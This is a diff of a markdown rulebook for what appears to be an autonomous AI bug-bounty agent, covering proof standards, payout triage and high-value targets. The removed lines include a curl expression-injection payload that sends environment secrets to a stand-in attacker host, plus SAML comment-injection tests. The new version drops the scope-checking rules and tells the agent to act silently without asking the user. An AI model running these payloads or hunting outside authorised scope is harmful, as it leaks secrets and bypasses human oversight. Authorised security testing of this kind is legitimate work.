@@ -1,261 +1,156 @@
-# Hunting Rules
-
-These rules are always active. Breaking them wastes time and reduces payout rate.
-
+---
+description: Always-active hunting rules. These are enforced automatically during /fullhunt — never ask the user.
 ---
 
-## 1. READ FULL SCOPE FIRST
+# Hunting Rules (Always Active)
 
-Before making a single request: read the program's in-scope and out-of-scope lists.
-One out-of-scope request = potential ban. One out-of-scope report = instant close.
+These rules are NON-NEGOTIABLE. During autonomous hunting, enforce every one silently.
 
-```
-Read: every in-scope domain
-Read: every out-of-scope exclusion
-Read: excluded bug classes ("we do not pay for X")
-Read: safe harbor clause
-```
-
-## 2. NEVER HUNT THEORETICAL BUGS
+## 1. NO THEORETICAL BUGS
 
 > "Can an attacker do this RIGHT NOW, against a real user, causing real harm?"
-> If NO — STOP. Do not explore further. Do not write it up. Move on.
-
-Theoretical bugs waste your time AND damage your validity ratio when submitted.
+> If NO — KILL IT. Do not explore further. Do not write it up. Move on.
 
 ```
 NOT a bug: "Could theoretically allow..."
 NOT a bug: "Wrong but no practical impact"
-NOT a bug: "3+ preconditions all simultaneously required"
+NOT a bug: "3+ unlikely preconditions required simultaneously"
 NOT a bug: Dead/unreachable code
-NOT a bug: SSRF with DNS callback only
+NOT a bug: SSRF with DNS callback only (no internal data)
+NOT a bug: Missing headers without demonstrated exploit
 ```
 
-## 2b. PAYABILITY GATE — Will This Actually Get Paid?
+## 2. VERIFY BEFORE YOU REPORT — EVERY TIME
 
-**BEFORE writing up ANY finding, check these:**
+Before generating ANY finding, you MUST:
+1. **Confirm the endpoint is reachable** (HTTP 200/302, not timeout/5xx)
+2. **Prove impact with actual data** (not just status codes)
+3. **Test with 2 accounts** for IDOR (attacker sees victim's data)
+4. **Confirm consent/auth bypass** for OAuth (auto-redirect, no consent screen)
+5. **Show actual response content** for info disclosure (not just 200 OK)
 
-### Step 1: Read the program's exclusion list
-Load `targets/$PROGRAM.json` → read the `rules` field. Programs list specific bug types they do NOT pay for. If your finding matches an exclusion → KILL IT.
+If you can't do step 2 → it's NOT a finding. KILL IT.
 
-### Step 2: Auto-reject these (almost never paid anywhere)
-```
-ALWAYS REJECTED — do NOT report:
-✗ Version/banner disclosure (server headers, info.jsp, /status endpoints)
-✗ Missing security headers (CSP, X-Frame-Options, HSTS)
-✗ SSL/TLS configuration issues
-✗ Cookie without Secure/HttpOnly flag (non-session cookies)
-✗ CSRF on non-state-changing actions (login, logout, search)
-✗ X-Requested-With as CSRF protection (this IS valid CSRF defense)
-✗ Clickjacking on non-sensitive pages
-✗ Text/content injection without XSS
-✗ Self-XSS (only works on yourself)
-✗ Rate limiting missing (unless it leads to brute-force ATO)
-✗ Open redirect alone (only valuable if chained with OAuth)
-✗ Stack traces / error messages (unless they leak secrets/credentials)
-✗ Directory listing on non-sensitive directories
-✗ Generic information disclosure (tech stack, internal IPs)
-✗ Email spoofing / SPF/DKIM/DMARC issues
-✗ Autocomplete enabled
-✗ Password complexity not enforced
-✗ Session timeout too long
-✗ CORS misconfiguration without proof of data theft
-✗ Host header injection without practical exploit
-✗ Path traversal that only reads public files
-✗ Exposed API that returns only public/catalogue data
-```
+## 3. PROOF REQUIREMENTS BY VULNERABILITY CLASS
 
-### Step 3: The "$500 Test"
-> "Would I bet $500 of my own money that this finding gets a bounty?"
-> If NO → don't waste 30 minutes writing a report. Keep hunting.
+| Vuln Class | Required Proof (without this = KILL IT) |
+|---|---|
+| IDOR | Victim's actual private data in attacker's response |
+| XSS | Cookie exfil or DOM manipulation (not just alert()) |
+| SSRF | Internal service response body (not just DNS callback) |
+| SQLi | Actual database content (not just error message) |
+| Auth bypass | Access to protected resource without valid creds |
+| OAuth | Silent redirect with code/token (no consent screen) |
+| JWT | Forged token accepted by server (not just decoded) |
+| XXE | File contents or OOB data (not just parser error) |
+| SSTI | RCE output or file read (not just math reflection) |
+| Open redirect | Only valid if chained (OAuth token theft, phishing) |
+| Race condition | Actual duplicate action completed (not just fast response) |
+| Cache poison | Poisoned response served to other users |
 
-### Step 4: Exploitation Required
-**Information disclosure alone is NOT enough.** You must demonstrate:
-- A working exploit (PoC that does something harmful)  
-- OR a chain where the info leads directly to an exploit
-- "I found version X" → rejected. "I found version X AND exploited CVE-Y to get RCE" → paid
+## 4. NEVER-SUBMIT LIST (Always N/A — auto-filter)
 
-## 2c. PRIORITIZE HIGH-VALUE ENDPOINTS
-
-Not all endpoints are equal. Focus on endpoints that handle:
-```
-🔴 HIGH VALUE — hunt these FIRST:
-  - User authentication (login, register, password reset, 2FA)
-  - User data (profile, settings, PII, payment info)
-  - Authorization (admin panels, role management, permissions)
-  - Financial (payments, transfers, credits, subscriptions)
-  - File operations (upload, download, export)
-  - API keys / tokens / secrets management
-
-🟡 MEDIUM VALUE:
-  - Search / filtering (potential SQLi/XSS)
-  - Content creation (comments, posts, messages — stored XSS)
-  - Sharing / collaboration features (IDOR on shared resources)
-  - Integrations / webhooks (SSRF potential)
-
-⚪ LOW VALUE — skip unless nothing else:
-  - Static pages, marketing sites
-  - Public catalogue / product listings
-  - Status pages, health checks
-  - Documentation / help pages
-```
-
-## 3. KILL WEAK FINDINGS FAST
-
-Run the 7-Question Gate BEFORE spending time on a finding. Kill at Q1 if needed.
-
-Every minute on a weak finding = a minute not finding a real one.
-
-## 4. CHECK SCOPE EXPLICITLY FOR EVERY ASSET
-
-Not just "does this domain look like the target?" — verify it's on the scope list.
-Check: Is it a third-party service they just use? Third-party = out of scope.
-
-## 5. 5-MINUTE RULE
-
-If a target surface shows nothing interesting after 5 minutes → move on.
-
-Kill signals:
-- All hosts return 403 or static pages
-- No API endpoints with ID parameters
-- No JavaScript bundles with interesting paths
-- nuclei returns 0 medium/high findings
-
-## 6. AUTOMATION = HIGHEST DUP RATE
-
-Use automation for RECON only (subdomain enum, live hosts, URL crawl).
-Manual testing finds unique bugs. Automated scanners find duplicates.
+These are ALWAYS rejected standalone. Never report them alone:
 
 ```
-Automation: recon (subfinder, httpx, katana, nuclei)
-Manual: IDOR testing, auth bypass, business logic, race conditions
+Missing security headers (CSP, HSTS, X-Frame-Options)
+GraphQL introspection enabled (alone)
+Self-XSS (requires victim to paste in own console)
+Open redirect alone (no chain)
+SSRF with DNS-only callback (no internal data)
+Logout CSRF
+Missing cookie flags alone (HttpOnly, Secure, SameSite)
+Rate limit on non-critical forms (login, search)
+Banner/version disclosure without working exploit
+Clickjacking without PoC on sensitive action
+CORS misconfiguration without credentialed data exfil
+Content-Type sniffing without demonstrated exploit
+```
+
+If you find one of these → check if it chains to something real.
+If no chain → KILL IT. Do not waste tokens reporting it.
+
+## 5. CHAIN BEFORE KILL — Conditionally Valid
+
+| You Found | Chain Available? |
+|---|---|
+| Open redirect | + OAuth code theft → ATO? |
+| SSRF DNS-only | + internal service data? |
+| Clickjacking | + sensitive action + PoC? |
+| CORS wildcard | + credentialed data exfil? |
+| Self-XSS | + CSRF to force inject? |
+| Missing header | + actual exploit using that gap? |
+
+If chain confirmed → report both together. If no chain → KILL IT.
+
+## 6. REACHABILITY CHECK (MANDATORY BEFORE EVERY FINDING)
+
+Before recording ANY finding, run this check:
+
+```python
+# MUST pass before any finding is recorded
+import requests
+resp = requests.get(target_url, timeout=10, verify=False)
+assert resp.status_code not in (0, 502, 503, 504), "Endpoint unreachable — KILL finding"
+assert resp.status_code != 403 or "WAF" not in resp.text, "WAF blocking — verify bypass first"
 ```
 
 ## 7. IMPACT-FIRST HUNTING
 
-Ask: "What's the worst thing that could happen if auth was broken here?"
+Hunt features with highest business impact first:
+1. **Payment/billing** — price manipulation, race on checkout
+2. **Auth/session** — account takeover, privilege escalation
+3. **Admin features** — auth bypass to admin
+4. **PII endpoints** — IDOR on user data
+5. **File handling** — upload, download, path traversal
+6. **API** — BOLA/BFLA, mass assignment
+7. **Everything else** — XSS, SSRF, etc.
 
-If the answer is "nothing valuable" → skip the feature.
-If the answer is "admin access, PII exfil, fund theft" → hunt there.
+## 8. 5-MINUTE RULE
 
-## 8. HUNT LESS-SATURATED BUG CLASSES
-
-High competition (skip unless target-specific): XSS, SSRF basics, open redirect alone
-Low competition: Cache poisoning, race conditions, business logic, HTTP smuggling, CI/CD
-
-## 9. DEPTH OVER BREADTH
-
-One target deeply understood > ten targets shallowly tested.
-
-```
-Read 5+ disclosed reports for the target before hunting
-Understand the business domain
-Map the crown jewels (what would hurt the company most?)
-```
-
-## 10. THE SIBLING RULE
-
-> "Check EVERY sibling endpoint. If `/api/user/123/orders` requires auth,
-> check `/api/user/123/export`, `/api/user/123/delete`, `/api/user/123/share`."
-
-This rule explains 30% of all paid IDOR/auth bugs.
-
-## 11. A→B SIGNAL METHOD
-
-When you confirm bug A → stop → hunt for B and C before writing the report.
-
-A confirmed bug = signal that the developer made a class of mistake.
-They made it elsewhere too. Finding B costs 10x less than finding A.
-
-Time-box: 20 minutes on B. If not confirmed → submit A and move on.
-
-## 12. NEW == UNREVIEWED
-
-Features < 30 days old have the lowest security maturity.
-Monitor GitHub commits. Hunt new features first.
-
-## 13. FOLLOW THE MONEY
-
-Billing/credits/refunds/wallet = most developer shortcuts taken.
-Price manipulation, race conditions on payment, quota bypass = high ROI.
-
-## 14. 20-MINUTE ROTATION RULE
-
-Every 20 min ask: "Am I making progress?"
-No → rotate to next endpoint, subdomain, or vuln class.
+Nothing interesting after 5 minutes on an endpoint → move on.
 Fresh context finds more bugs than brute force.
 
-## 15. BUSINESS IMPACT > VULN CLASS
+## 9. THE SIBLING RULE
 
-Clickjacking is usually $0 but MetaMask paid $120K for one.
-Ask: "What's the business impact?" before estimating severity.
+If `/api/user/123/orders` has auth → check:
+- `/api/user/123/export`
+- `/api/user/123/delete`
+- `/api/user/123/share`
 
-## 16. VALIDATE BEFORE WRITING
+30% of paid IDOR bugs come from siblings.
 
-Run /validate before starting a report. Gate 0 is 30 seconds.
-It takes 30 seconds to kill a bad lead. A report takes 30 minutes to write.
+## 10. A→B SIGNAL METHOD
 
-## 17. CREDENTIAL LEAKS NEED EXPLOITATION PROOF
+When you confirm bug A → don't report yet → hunt B and C first.
+A confirmed bug = the developer made a class of mistake.
+They made it elsewhere too. Finding B costs 10x less than finding A.
+
+## 11. DEPTH OVER BREADTH
+
+One target deeply understood > ten targets shallowly tested.
+Read 5+ disclosed reports for the target before hunting.
+
+## 12. FOLLOW THE MONEY
+
+Billing/credits/refunds/wallet = most developer shortcuts.
+Always test: price manipulation, race on payment, quota bypass.
+
+## 13. SEPARATE BUGS = SEPARATE REPORTS
+
+If A and B are independent bugs (different endpoints, different impact):
+Report them SEPARATELY = separate payouts.
+Only combine if they're part of ONE attack chain.
+
+## 14. DEDUP BEFORE REPORT
+
+Before generating report for any finding:
+1. Search HackerOne Hacktivity for endpoint + bug class
+2. Check if vulnerability is documented behavior
+3. If likely duplicate → KILL IT
+
+## 15. CREDENTIAL LEAKS NEED EXPLOITATION PROOF
 
 Finding an API key = Informational.
-Proving what the key accesses (S3 read, database, admin panel) = Medium/High.
-
+Proving what the key accesses (S3 read, database, admin) = Medium/High.
 Always call the API as the leaked key. Enumerate permissions.
-
-## 18. MOBILE = DIFFERENT ATTACK SURFACE
-
-Mobile apps expose endpoints that the web app doesn't. Always decompile the APK/IPA when in scope:
-- Hardcoded secrets in `strings` output that web recon never finds
-- API endpoints in decompiled source that aren't in the web JS
-- Deep-link handlers with injection points
-- WebView `addJavascriptInterface` = JS→Java bridge (RCE on API < 17)
-- Certificate pinning bypass via Frida/objection → MitM all traffic
-
-```bash
-# Quick check without rooted device
-apktool d target.apk -o target_src
-grep -rn "api_key\|secret\|password\|token\|Authorization\|Bearer" target_src/ --include="*.smali" --include="*.xml"
-grep -rn "https://" target_src/ | grep -v "schema\|xmlns\|android\|google" | head -50
-```
-
-## 19. CI/CD IS ATTACK SURFACE
-
-GitHub Actions / GitLab CI pipelines often have critical secrets. Check BEFORE writing any report on a target with public repos.
-
-```bash
-# Clone target's public GitHub org repos, then:
-find . -name "*.yml" -path "*/.github/workflows/*" | xargs grep -l "pull_request_target\|secrets\."
-
-# Key dangerous patterns:
-# 1. pull_request_target + checkout of PR branch = attacker code runs with repo secrets
-# 2. ${{ github.event.issue.title }} in run: block = expression injection = secret exfil
-# 3. artifact download without hash check = artifact poisoning
-# 4. self-hosted runners = escape to org infrastructure
-```
-
-**Expression injection PoC (create an issue with this title):**
-```
-test"; curl https://ATTACKER.com/$(env | base64 -w0) #
-```
-If workflow runs → org secrets exfiltrated. CVSS 9.3 (Critical).
-
-## 20. SAML / SSO = HIGHEST AUTH BUG DENSITY
-
-SAML implementations are notoriously buggy. If target uses SSO, always test:
-- XML signature wrapping (XSW) — valid signature, injected assertion
-- Comment injection — `admin<!---->@company.com` = sign as admin
-- XML external entity in SAML assertion
-- Signature stripping (remove signature, server still accepts)
-- NameID manipulation — change email in unsigned field
-
-```bash
-# Capture SAML assertion (base64 decode from SAMLResponse parameter)
-echo "SAMLResponse_VALUE" | base64 -d | xmllint --format -
-
-# Test comment injection in NameID
-# Change: <NameID>user@company.com</NameID>
-# To:     <NameID>admin<!---->@company.com</NameID>
-# Or:     <NameID Format="...">admin@company.com</NameID> (duplicate element)
-```
-
-> SAML bugs frequently pay High–Critical because they enable SSO bypass across the entire platform.
